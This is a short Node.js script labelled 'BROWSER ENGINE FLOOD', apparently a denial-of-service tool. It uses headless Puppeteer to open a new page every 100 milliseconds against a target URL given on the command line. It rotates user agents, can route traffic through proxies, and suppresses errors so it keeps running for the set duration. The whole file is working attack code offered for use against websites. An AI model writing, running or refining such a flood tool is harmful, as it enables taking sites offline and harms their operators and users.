/*
 *
 * BROWSER ENGINE FLOOD
 * node HttpSpam.js Url Time
 *
 */

const puppeteer = require("puppeteer-extra"),
  useProxy = require("puppeteer-page-proxy"),
  fs = require("fs");

var target = process.argv[2];
var time = process.argv[3];
var proxy = process.argv[4];
const proxies = fs.readFileSync(proxy, "utf-8").toString().split("\n");
var ua = process.argv[5];
const uas = fs.readFileSync(ua, "utf-8").toString().split("\n");

async function BigLeaks() {
  const browser = await puppeteer.launch({
    headless: true,
    ignoreHTTPSErrors: true,
    args: [
      "--no-sandbox",
      "--window-size=1920,1080",
      "--disable-setuid-sandbox",
      "--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
    ],
    defaultViewport: null,
  });

  async function Start() {
    const page = await browser.newPage();

    page.setDefaultNavigationTimeout(0);

    await page.setUserAgent(uas[Math.floor(Math.random() * uas.length)]);

    await page.setRequestInterception(true);
    page.on("request", async (request) => {
      await useProxy(request);
      // await useProxy(request, "socks5://"+proxies[Math.floor(Math.random() * proxies.length)]);
    });

    await page.goto(target);
    await page.waitFor(8000);
    // await page.screenshot({ path: "./1.png" });
    page.close();
  }

  // Start();
  setInterval(function () {
    Start();
  }, 100);
}

BigLeaks();

setTimeout(() => process.exit(-1), time * 1000);

// to not crash on errors
process.on("uncaughtException", function (err) {
  //console.log(err);
});

process.on("unhandledRejection", function (err) {
  //console.log(err);
});
